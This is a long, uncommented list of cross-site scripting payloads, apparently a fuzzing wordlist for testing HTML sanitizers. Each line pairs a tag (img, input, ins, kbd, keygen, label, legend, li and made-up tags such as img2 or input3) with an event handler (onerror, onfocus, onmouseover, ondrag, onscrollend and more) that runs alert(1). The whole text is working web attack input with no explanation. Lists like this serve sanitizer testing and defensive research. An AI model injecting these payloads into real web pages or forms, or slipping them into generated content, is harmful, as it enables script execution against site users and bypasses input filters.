<image3 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></image3>
<img contenteditable onbeforeinput=alert(1)>test
<img draggable="true" ondrag="alert(1)" style=display:block>test</img>
<img draggable="true" ondragend="alert(1)" style=display:block>test</img>
<img draggable="true" ondragenter="alert(1)" style=display:block>test</img>
<img draggable="true" ondragleave="alert(1)" style=display:block>test</img>
<img draggable="true" ondragstart="alert(1)" style=display:block>test</img>
<img id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></img>
<img id=x tabindex=1 onfocus=alert(1)></img>
<img id=x tabindex=1 onfocusin=alert(1)></img>
<img onafterscriptexecute=alert(1)><script>1</script>
<img onbeforecopy="alert(1)" contenteditable>test</img>
<img onbeforecut="alert(1)" contenteditable>test</img>
<img onbeforescriptexecute=alert(1)><script>1</script>
<img onblur=alert(1) id=x tabindex=1 style=display:block>test</img><input value=clickme>
<img onclick="alert(1)" style=display:block>test</img>
<img oncontextmenu="alert(1)" style=display:block>test</img>
<img oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<img oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<img ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</img>
<img onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</img><input value=clickme>
<img onkeydown="alert(1)" contenteditable style=display:block>test</img>
<img onkeypress="alert(1)" contenteditable style=display:block>test</img>
<img onkeyup="alert(1)" contenteditable style=display:block>test</img>
<img onmousedown="alert(1)" style=display:block>test</img>
<img onmouseenter="alert(1)" style=display:block>test</img>
<img onmouseleave="alert(1)" style=display:block>test</img>
<img onmousemove="alert(1)" style=display:block>test</img>
<img onmouseout="alert(1)" style=display:block>test</img>
<img onmouseover="alert(1)" style=display:block>test</img>
<img onmouseup="alert(1)" style=display:block>test</img>
<img onmousewheel=alert(1) style=display:block>requires scrolling
<img onpaste="alert(1)" contenteditable>test</img>
<img onpointerdown=alert(1) style=display:block>XSS</img>
<img onpointerenter=alert(1) style=display:block>XSS</img>
<img onpointerleave=alert(1) style=display:block>XSS</img>
<img onpointermove=alert(1) style=display:block>XSS</img>
<img onpointerout=alert(1) style=display:block>XSS</img>
<img onpointerover=alert(1) style=display:block>XSS</img>
<img onpointerrawupdate=alert(1) style=display:block>XSS</img>
<img onpointerup=alert(1) style=display:block>XSS</img>
<img onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></img>
<img src/onerror=alert(1)>
<img src=validimage.png onload=alert(1)>
<img srcset=1 onerror=alert(1)>
<img srcset=validimage.png onload=alert(1)>
<img usemap=#x><map name="x"><area href onfocus=alert(1) id=x>
<img usemap=#x><map name="x"><area href onfocusin=alert(1) id=x>
<img2 contenteditable onbeforeinput=alert(1)>test
<img2 draggable="true" ondrag="alert(1)" style=display:block>test</img2>
<img2 draggable="true" ondragend="alert(1)" style=display:block>test</img2>
<img2 draggable="true" ondragenter="alert(1)" style=display:block>test</img2>
<img2 draggable="true" ondragleave="alert(1)" style=display:block>test</img2>
<img2 draggable="true" ondragstart="alert(1)" style=display:block>test</img2>
<img2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></img2>
<img2 onafterscriptexecute=alert(1)><script>1</script>
<img2 onbeforescriptexecute=alert(1)><script>1</script>
<img2 onblur=alert(1) id=x tabindex=1 style=display:block>test</img2><input value=clickme>
<img2 onclick="alert(1)" style=display:block>test</img2>
<img2 oncontextmenu="alert(1)" style=display:block>test</img2>
<img2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<img2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<img2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</img2>
<img2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</img2><input value=clickme>
<img2 onkeydown="alert(1)" contenteditable style=display:block>test</img2>
<img2 onkeypress="alert(1)" contenteditable style=display:block>test</img2>
<img2 onkeyup="alert(1)" contenteditable style=display:block>test</img2>
<img2 onmousedown="alert(1)" style=display:block>test</img2>
<img2 onmouseenter="alert(1)" style=display:block>test</img2>
<img2 onmouseleave="alert(1)" style=display:block>test</img2>
<img2 onmousemove="alert(1)" style=display:block>test</img2>
<img2 onmouseout="alert(1)" style=display:block>test</img2>
<img2 onmouseover="alert(1)" style=display:block>test</img2>
<img2 onmouseup="alert(1)" style=display:block>test</img2>
<img2 onmousewheel=alert(1) style=display:block>requires scrolling
<img2 onpointerdown=alert(1) style=display:block>XSS</img2>
<img2 onpointerenter=alert(1) style=display:block>XSS</img2>
<img2 onpointerleave=alert(1) style=display:block>XSS</img2>
<img2 onpointermove=alert(1) style=display:block>XSS</img2>
<img2 onpointerout=alert(1) style=display:block>XSS</img2>
<img2 onpointerover=alert(1) style=display:block>XSS</img2>
<img2 onpointerrawupdate=alert(1) style=display:block>XSS</img2>
<img2 onpointerup=alert(1) style=display:block>XSS</img2>
<img2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></img2>
<input autofocus onfocus=alert(1)>
<input autofocus onfocusin=alert(1)>
<input contenteditable onbeforeinput=alert(1)>test
<input draggable="true" ondrag="alert(1)" style=display:block>test</input>
<input draggable="true" ondragend="alert(1)" style=display:block>test</input>
<input draggable="true" ondragenter="alert(1)" style=display:block>test</input>
<input draggable="true" ondragleave="alert(1)" style=display:block>test</input>
<input draggable="true" ondragstart="alert(1)" style=display:block>test</input>
<input id=x onfocus=alert(1)>
<input id=x onfocusin=alert(1)>
<input id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></input>
<input onafterscriptexecute=alert(1)><script>1</script>
<input onauxclick=alert(1)>
<input onbeforecopy=alert(1) value="XSS" autofocus>
<input onbeforecut=alert(1) value="XSS" autofocus>
<input onbeforescriptexecute=alert(1)><script>1</script>
<input onblur=alert(1) id=x tabindex=1 style=display:block>test</input><input value=clickme>
<input onchange=alert(1) value=xss>
<input onclick="alert(1)" style=display:block>test</input>
<input oncontextmenu="alert(1)" style=display:block>test</input>
<input oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</input>
<input onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</input><input value=clickme>
<input oninput=alert(1) value=xss>
<input onkeydown="alert(1)" contenteditable style=display:block>test</input>
<input onkeypress="alert(1)" contenteditable style=display:block>test</input>
<input onkeyup="alert(1)" contenteditable style=display:block>test</input>
<input onmousedown="alert(1)" style=display:block>test</input>
<input onmouseenter="alert(1)" style=display:block>test</input>
<input onmouseleave="alert(1)" style=display:block>test</input>
<input onmousemove="alert(1)" style=display:block>test</input>
<input onmouseout="alert(1)" style=display:block>test</input>
<input onmouseover="alert(1)" style=display:block>test</input>
<input onmouseup="alert(1)" style=display:block>test</input>
<input onmousewheel=alert(1) style=display:block>requires scrolling
<input onpaste=alert(1) value="" autofocus>
<input onpointerdown=alert(1) style=display:block>XSS</input>
<input onpointerenter=alert(1) style=display:block>XSS</input>
<input onpointerleave=alert(1) style=display:block>XSS</input>
<input onpointermove=alert(1) style=display:block>XSS</input>
<input onpointerout=alert(1) style=display:block>XSS</input>
<input onpointerover=alert(1) style=display:block>XSS</input>
<input onpointerrawupdate=alert(1) style=display:block>XSS</input>
<input onpointerup=alert(1) style=display:block>XSS</input>
<input onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></input>
<input onselect=alert(1) value="XSS" autofocus>
<input type=checkbox id=x onfocus=alert(1)>
<input type=checkbox id=x onfocusin=alert(1)>
<input type=image src=1 onerror=alert(1)>
<input type=image src=validimage.png onload=alert(1)>
<input type=radio id=x onfocus=alert(1)>
<input type=radio id=x onfocusin=alert(1)>
<input2 contenteditable onbeforeinput=alert(1)>test
<input2 draggable="true" ondrag="alert(1)" style=display:block>test</input2>
<input2 draggable="true" ondragend="alert(1)" style=display:block>test</input2>
<input2 draggable="true" ondragenter="alert(1)" style=display:block>test</input2>
<input2 draggable="true" ondragleave="alert(1)" style=display:block>test</input2>
<input2 draggable="true" ondragstart="alert(1)" style=display:block>test</input2>
<input2 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></input2>
<input2 onafterscriptexecute=alert(1)><script>1</script>
<input2 onbeforescriptexecute=alert(1)><script>1</script>
<input2 onblur=alert(1) id=x tabindex=1 style=display:block>test</input2><input value=clickme>
<input2 onclick="alert(1)" style=display:block>test</input2>
<input2 oncontextmenu="alert(1)" style=display:block>test</input2>
<input2 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input2 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input2 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</input2>
<input2 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</input2><input value=clickme>
<input2 onkeydown="alert(1)" contenteditable style=display:block>test</input2>
<input2 onkeypress="alert(1)" contenteditable style=display:block>test</input2>
<input2 onkeyup="alert(1)" contenteditable style=display:block>test</input2>
<input2 onmousedown="alert(1)" style=display:block>test</input2>
<input2 onmouseenter="alert(1)" style=display:block>test</input2>
<input2 onmouseleave="alert(1)" style=display:block>test</input2>
<input2 onmousemove="alert(1)" style=display:block>test</input2>
<input2 onmouseout="alert(1)" style=display:block>test</input2>
<input2 onmouseover="alert(1)" style=display:block>test</input2>
<input2 onmouseup="alert(1)" style=display:block>test</input2>
<input2 onmousewheel=alert(1) style=display:block>requires scrolling
<input2 onpointerdown=alert(1) style=display:block>XSS</input2>
<input2 onpointerenter=alert(1) style=display:block>XSS</input2>
<input2 onpointerleave=alert(1) style=display:block>XSS</input2>
<input2 onpointermove=alert(1) style=display:block>XSS</input2>
<input2 onpointerout=alert(1) style=display:block>XSS</input2>
<input2 onpointerover=alert(1) style=display:block>XSS</input2>
<input2 onpointerrawupdate=alert(1) style=display:block>XSS</input2>
<input2 onpointerup=alert(1) style=display:block>XSS</input2>
<input2 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></input2>
<input3 contenteditable onbeforeinput=alert(1)>test
<input3 draggable="true" ondrag="alert(1)" style=display:block>test</input3>
<input3 draggable="true" ondragend="alert(1)" style=display:block>test</input3>
<input3 draggable="true" ondragenter="alert(1)" style=display:block>test</input3>
<input3 draggable="true" ondragleave="alert(1)" style=display:block>test</input3>
<input3 draggable="true" ondragstart="alert(1)" style=display:block>test</input3>
<input3 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></input3>
<input3 onafterscriptexecute=alert(1)><script>1</script>
<input3 onbeforescriptexecute=alert(1)><script>1</script>
<input3 onblur=alert(1) id=x tabindex=1 style=display:block>test</input3><input value=clickme>
<input3 onclick="alert(1)" style=display:block>test</input3>
<input3 oncontextmenu="alert(1)" style=display:block>test</input3>
<input3 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input3 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input3 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</input3>
<input3 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</input3><input value=clickme>
<input3 onkeydown="alert(1)" contenteditable style=display:block>test</input3>
<input3 onkeypress="alert(1)" contenteditable style=display:block>test</input3>
<input3 onkeyup="alert(1)" contenteditable style=display:block>test</input3>
<input3 onmousedown="alert(1)" style=display:block>test</input3>
<input3 onmouseenter="alert(1)" style=display:block>test</input3>
<input3 onmouseleave="alert(1)" style=display:block>test</input3>
<input3 onmousemove="alert(1)" style=display:block>test</input3>
<input3 onmouseout="alert(1)" style=display:block>test</input3>
<input3 onmouseover="alert(1)" style=display:block>test</input3>
<input3 onmouseup="alert(1)" style=display:block>test</input3>
<input3 onmousewheel=alert(1) style=display:block>requires scrolling
<input3 onpointerdown=alert(1) style=display:block>XSS</input3>
<input3 onpointerenter=alert(1) style=display:block>XSS</input3>
<input3 onpointerleave=alert(1) style=display:block>XSS</input3>
<input3 onpointermove=alert(1) style=display:block>XSS</input3>
<input3 onpointerout=alert(1) style=display:block>XSS</input3>
<input3 onpointerover=alert(1) style=display:block>XSS</input3>
<input3 onpointerrawupdate=alert(1) style=display:block>XSS</input3>
<input3 onpointerup=alert(1) style=display:block>XSS</input3>
<input3 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></input3>
<input4 contenteditable onbeforeinput=alert(1)>test
<input4 draggable="true" ondrag="alert(1)" style=display:block>test</input4>
<input4 draggable="true" ondragend="alert(1)" style=display:block>test</input4>
<input4 draggable="true" ondragenter="alert(1)" style=display:block>test</input4>
<input4 draggable="true" ondragleave="alert(1)" style=display:block>test</input4>
<input4 draggable="true" ondragstart="alert(1)" style=display:block>test</input4>
<input4 id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></input4>
<input4 onafterscriptexecute=alert(1)><script>1</script>
<input4 onbeforescriptexecute=alert(1)><script>1</script>
<input4 onblur=alert(1) id=x tabindex=1 style=display:block>test</input4><input value=clickme>
<input4 onclick="alert(1)" style=display:block>test</input4>
<input4 oncontextmenu="alert(1)" style=display:block>test</input4>
<input4 oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input4 oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<input4 ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</input4>
<input4 onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</input4><input value=clickme>
<input4 onkeydown="alert(1)" contenteditable style=display:block>test</input4>
<input4 onkeypress="alert(1)" contenteditable style=display:block>test</input4>
<input4 onkeyup="alert(1)" contenteditable style=display:block>test</input4>
<input4 onmousedown="alert(1)" style=display:block>test</input4>
<input4 onmouseenter="alert(1)" style=display:block>test</input4>
<input4 onmouseleave="alert(1)" style=display:block>test</input4>
<input4 onmousemove="alert(1)" style=display:block>test</input4>
<input4 onmouseout="alert(1)" style=display:block>test</input4>
<input4 onmouseover="alert(1)" style=display:block>test</input4>
<input4 onmouseup="alert(1)" style=display:block>test</input4>
<input4 onmousewheel=alert(1) style=display:block>requires scrolling
<input4 onpointerdown=alert(1) style=display:block>XSS</input4>
<input4 onpointerenter=alert(1) style=display:block>XSS</input4>
<input4 onpointerleave=alert(1) style=display:block>XSS</input4>
<input4 onpointermove=alert(1) style=display:block>XSS</input4>
<input4 onpointerout=alert(1) style=display:block>XSS</input4>
<input4 onpointerover=alert(1) style=display:block>XSS</input4>
<input4 onpointerrawupdate=alert(1) style=display:block>XSS</input4>
<input4 onpointerup=alert(1) style=display:block>XSS</input4>
<input4 onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></input4>
<ins contenteditable onbeforeinput=alert(1)>test
<ins draggable="true" ondrag="alert(1)" style=display:block>test</ins>
<ins draggable="true" ondragend="alert(1)" style=display:block>test</ins>
<ins draggable="true" ondragenter="alert(1)" style=display:block>test</ins>
<ins draggable="true" ondragleave="alert(1)" style=display:block>test</ins>
<ins draggable="true" ondragstart="alert(1)" style=display:block>test</ins>
<ins id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></ins>
<ins id=x tabindex=1 onfocus=alert(1)></ins>
<ins id=x tabindex=1 onfocusin=alert(1)></ins>
<ins onafterscriptexecute=alert(1)><script>1</script>
<ins onbeforecopy="alert(1)" contenteditable>test</ins>
<ins onbeforecut="alert(1)" contenteditable>test</ins>
<ins onbeforescriptexecute=alert(1)><script>1</script>
<ins onblur=alert(1) id=x tabindex=1 style=display:block>test</ins><input value=clickme>
<ins onclick="alert(1)" style=display:block>test</ins>
<ins oncontextmenu="alert(1)" style=display:block>test</ins>
<ins oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ins oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<ins ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</ins>
<ins onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</ins><input value=clickme>
<ins onkeydown="alert(1)" contenteditable style=display:block>test</ins>
<ins onkeypress="alert(1)" contenteditable style=display:block>test</ins>
<ins onkeyup="alert(1)" contenteditable style=display:block>test</ins>
<ins onmousedown="alert(1)" style=display:block>test</ins>
<ins onmouseenter="alert(1)" style=display:block>test</ins>
<ins onmouseleave="alert(1)" style=display:block>test</ins>
<ins onmousemove="alert(1)" style=display:block>test</ins>
<ins onmouseout="alert(1)" style=display:block>test</ins>
<ins onmouseover="alert(1)" style=display:block>test</ins>
<ins onmouseup="alert(1)" style=display:block>test</ins>
<ins onmousewheel=alert(1) style=display:block>requires scrolling
<ins onpaste="alert(1)" contenteditable>test</ins>
<ins onpointerdown=alert(1) style=display:block>XSS</ins>
<ins onpointerenter=alert(1) style=display:block>XSS</ins>
<ins onpointerleave=alert(1) style=display:block>XSS</ins>
<ins onpointermove=alert(1) style=display:block>XSS</ins>
<ins onpointerout=alert(1) style=display:block>XSS</ins>
<ins onpointerover=alert(1) style=display:block>XSS</ins>
<ins onpointerrawupdate=alert(1) style=display:block>XSS</ins>
<ins onpointerup=alert(1) style=display:block>XSS</ins>
<ins onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></ins>
<kbd contenteditable onbeforeinput=alert(1)>test
<kbd draggable="true" ondrag="alert(1)" style=display:block>test</kbd>
<kbd draggable="true" ondragend="alert(1)" style=display:block>test</kbd>
<kbd draggable="true" ondragenter="alert(1)" style=display:block>test</kbd>
<kbd draggable="true" ondragleave="alert(1)" style=display:block>test</kbd>
<kbd draggable="true" ondragstart="alert(1)" style=display:block>test</kbd>
<kbd id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></kbd>
<kbd id=x tabindex=1 onfocus=alert(1)></kbd>
<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
<kbd onafterscriptexecute=alert(1)><script>1</script>
<kbd onbeforecopy="alert(1)" contenteditable>test</kbd>
<kbd onbeforecut="alert(1)" contenteditable>test</kbd>
<kbd onbeforescriptexecute=alert(1)><script>1</script>
<kbd onblur=alert(1) id=x tabindex=1 style=display:block>test</kbd><input value=clickme>
<kbd onclick="alert(1)" style=display:block>test</kbd>
<kbd oncontextmenu="alert(1)" style=display:block>test</kbd>
<kbd oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<kbd oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<kbd ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</kbd>
<kbd onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</kbd><input value=clickme>
<kbd onkeydown="alert(1)" contenteditable style=display:block>test</kbd>
<kbd onkeypress="alert(1)" contenteditable style=display:block>test</kbd>
<kbd onkeyup="alert(1)" contenteditable style=display:block>test</kbd>
<kbd onmousedown="alert(1)" style=display:block>test</kbd>
<kbd onmouseenter="alert(1)" style=display:block>test</kbd>
<kbd onmouseleave="alert(1)" style=display:block>test</kbd>
<kbd onmousemove="alert(1)" style=display:block>test</kbd>
<kbd onmouseout="alert(1)" style=display:block>test</kbd>
<kbd onmouseover="alert(1)" style=display:block>test</kbd>
<kbd onmouseup="alert(1)" style=display:block>test</kbd>
<kbd onmousewheel=alert(1) style=display:block>requires scrolling
<kbd onpaste="alert(1)" contenteditable>test</kbd>
<kbd onpointerdown=alert(1) style=display:block>XSS</kbd>
<kbd onpointerenter=alert(1) style=display:block>XSS</kbd>
<kbd onpointerleave=alert(1) style=display:block>XSS</kbd>
<kbd onpointermove=alert(1) style=display:block>XSS</kbd>
<kbd onpointerout=alert(1) style=display:block>XSS</kbd>
<kbd onpointerover=alert(1) style=display:block>XSS</kbd>
<kbd onpointerrawupdate=alert(1) style=display:block>XSS</kbd>
<kbd onpointerup=alert(1) style=display:block>XSS</kbd>
<kbd onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></kbd>
<keygen autofocus onfocus=alert(1)>
<keygen autofocus onfocusin=alert(1)>
<keygen contenteditable onbeforeinput=alert(1)>test
<keygen draggable="true" ondrag="alert(1)" style=display:block>test</keygen>
<keygen draggable="true" ondragend="alert(1)" style=display:block>test</keygen>
<keygen draggable="true" ondragenter="alert(1)" style=display:block>test</keygen>
<keygen draggable="true" ondragleave="alert(1)" style=display:block>test</keygen>
<keygen draggable="true" ondragstart="alert(1)" style=display:block>test</keygen>
<keygen id=x onfocus=alert(1)>
<keygen id=x onfocusin=alert(1)>
<keygen id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></keygen>
<keygen onafterscriptexecute=alert(1)><script>1</script>
<keygen onbeforecopy="alert(1)" contenteditable>test</keygen>
<keygen onbeforecut="alert(1)" contenteditable>test</keygen>
<keygen onbeforescriptexecute=alert(1)><script>1</script>
<keygen onblur=alert(1) id=x tabindex=1 style=display:block>test</keygen><input value=clickme>
<keygen onclick="alert(1)" style=display:block>test</keygen>
<keygen oncontextmenu="alert(1)" style=display:block>test</keygen>
<keygen oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<keygen oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<keygen ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</keygen>
<keygen onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</keygen><input value=clickme>
<keygen onkeydown="alert(1)" contenteditable style=display:block>test</keygen>
<keygen onkeypress="alert(1)" contenteditable style=display:block>test</keygen>
<keygen onkeyup="alert(1)" contenteditable style=display:block>test</keygen>
<keygen onmousedown="alert(1)" style=display:block>test</keygen>
<keygen onmouseenter="alert(1)" style=display:block>test</keygen>
<keygen onmouseleave="alert(1)" style=display:block>test</keygen>
<keygen onmousemove="alert(1)" style=display:block>test</keygen>
<keygen onmouseout="alert(1)" style=display:block>test</keygen>
<keygen onmouseover="alert(1)" style=display:block>test</keygen>
<keygen onmouseup="alert(1)" style=display:block>test</keygen>
<keygen onmousewheel=alert(1) style=display:block>requires scrolling
<keygen onpaste="alert(1)" contenteditable>test</keygen>
<keygen onpointerdown=alert(1) style=display:block>XSS</keygen>
<keygen onpointerenter=alert(1) style=display:block>XSS</keygen>
<keygen onpointerleave=alert(1) style=display:block>XSS</keygen>
<keygen onpointermove=alert(1) style=display:block>XSS</keygen>
<keygen onpointerout=alert(1) style=display:block>XSS</keygen>
<keygen onpointerover=alert(1) style=display:block>XSS</keygen>
<keygen onpointerrawupdate=alert(1) style=display:block>XSS</keygen>
<keygen onpointerup=alert(1) style=display:block>XSS</keygen>
<keygen onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></keygen>
<label contenteditable onbeforeinput=alert(1)>test
<label draggable="true" ondrag="alert(1)" style=display:block>test</label>
<label draggable="true" ondragend="alert(1)" style=display:block>test</label>
<label draggable="true" ondragenter="alert(1)" style=display:block>test</label>
<label draggable="true" ondragleave="alert(1)" style=display:block>test</label>
<label draggable="true" ondragstart="alert(1)" style=display:block>test</label>
<label id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></label>
<label id=x tabindex=1 onfocus=alert(1)></label>
<label id=x tabindex=1 onfocusin=alert(1)></label>
<label onafterscriptexecute=alert(1)><script>1</script>
<label onbeforecopy="alert(1)" contenteditable>test</label>
<label onbeforecut="alert(1)" contenteditable>test</label>
<label onbeforescriptexecute=alert(1)><script>1</script>
<label onblur=alert(1) id=x tabindex=1 style=display:block>test</label><input value=clickme>
<label onclick="alert(1)" style=display:block>test</label>
<label oncontextmenu="alert(1)" style=display:block>test</label>
<label oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<label oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<label ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</label>
<label onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</label><input value=clickme>
<label onkeydown="alert(1)" contenteditable style=display:block>test</label>
<label onkeypress="alert(1)" contenteditable style=display:block>test</label>
<label onkeyup="alert(1)" contenteditable style=display:block>test</label>
<label onmousedown="alert(1)" style=display:block>test</label>
<label onmouseenter="alert(1)" style=display:block>test</label>
<label onmouseleave="alert(1)" style=display:block>test</label>
<label onmousemove="alert(1)" style=display:block>test</label>
<label onmouseout="alert(1)" style=display:block>test</label>
<label onmouseover="alert(1)" style=display:block>test</label>
<label onmouseup="alert(1)" style=display:block>test</label>
<label onmousewheel=alert(1) style=display:block>requires scrolling
<label onpaste="alert(1)" contenteditable>test</label>
<label onpointerdown=alert(1) style=display:block>XSS</label>
<label onpointerenter=alert(1) style=display:block>XSS</label>
<label onpointerleave=alert(1) style=display:block>XSS</label>
<label onpointermove=alert(1) style=display:block>XSS</label>
<label onpointerout=alert(1) style=display:block>XSS</label>
<label onpointerover=alert(1) style=display:block>XSS</label>
<label onpointerrawupdate=alert(1) style=display:block>XSS</label>
<label onpointerup=alert(1) style=display:block>XSS</label>
<label onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></label>
<legend contenteditable onbeforeinput=alert(1)>test
<legend draggable="true" ondrag="alert(1)" style=display:block>test</legend>
<legend draggable="true" ondragend="alert(1)" style=display:block>test</legend>
<legend draggable="true" ondragenter="alert(1)" style=display:block>test</legend>
<legend draggable="true" ondragleave="alert(1)" style=display:block>test</legend>
<legend draggable="true" ondragstart="alert(1)" style=display:block>test</legend>
<legend id=x style="transition:outline 1s" ontransitionend=alert(1) tabindex=1></legend>
<legend id=x tabindex=1 onfocus=alert(1)></legend>
<legend id=x tabindex=1 onfocusin=alert(1)></legend>
<legend onafterscriptexecute=alert(1)><script>1</script>
<legend onbeforecopy="alert(1)" contenteditable>test</legend>
<legend onbeforecut="alert(1)" contenteditable>test</legend>
<legend onbeforescriptexecute=alert(1)><script>1</script>
<legend onblur=alert(1) id=x tabindex=1 style=display:block>test</legend><input value=clickme>
<legend onclick="alert(1)" style=display:block>test</legend>
<legend oncontextmenu="alert(1)" style=display:block>test</legend>
<legend oncopy=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<legend oncut=alert(1) value="XSS" autofocus tabindex=1 style=display:block>test
<legend ondblclick="alert(1)" autofocus tabindex=1 style=display:block>test</legend>
<legend onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</legend><input value=clickme>
<legend onkeydown="alert(1)" contenteditable style=display:block>test</legend>
<legend onkeypress="alert(1)" contenteditable style=display:block>test</legend>
<legend onkeyup="alert(1)" contenteditable style=display:block>test</legend>
<legend onmousedown="alert(1)" style=display:block>test</legend>
<legend onmouseenter="alert(1)" style=display:block>test</legend>
<legend onmouseleave="alert(1)" style=display:block>test</legend>
<legend onmousemove="alert(1)" style=display:block>test</legend>
<legend onmouseout="alert(1)" style=display:block>test</legend>
<legend onmouseover="alert(1)" style=display:block>test</legend>
<legend onmouseup="alert(1)" style=display:block>test</legend>
<legend onmousewheel=alert(1) style=display:block>requires scrolling
<legend onpaste="alert(1)" contenteditable>test</legend>
<legend onpointerdown=alert(1) style=display:block>XSS</legend>
<legend onpointerenter=alert(1) style=display:block>XSS</legend>
<legend onpointerleave=alert(1) style=display:block>XSS</legend>
<legend onpointermove=alert(1) style=display:block>XSS</legend>
<legend onpointerout=alert(1) style=display:block>XSS</legend>
<legend onpointerover=alert(1) style=display:block>XSS</legend>
<legend onpointerrawupdate=alert(1) style=display:block>XSS</legend>
<legend onpointerup=alert(1) style=display:block>XSS</legend>
<legend onscrollend=alert(1) style="display:block;overflow:auto;border:1px dashed;width:500px;height:100px;"><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>test</span></legend>
<li contenteditable onbeforeinput=alert(1)>test
<li draggable="true" ondrag="alert(1)" style=display:block>test</li>
<li draggable="true" ondragend="alert(1)" style=display:block>test</li>
<li draggable="true" ondragenter="alert(1)" style=display:block>test</li>
<li draggable="true" ondragleave="alert(1)" style=display:block>test</li>
<li draggable="true" ondragstart="alert(1)" style=display:block>test</li>
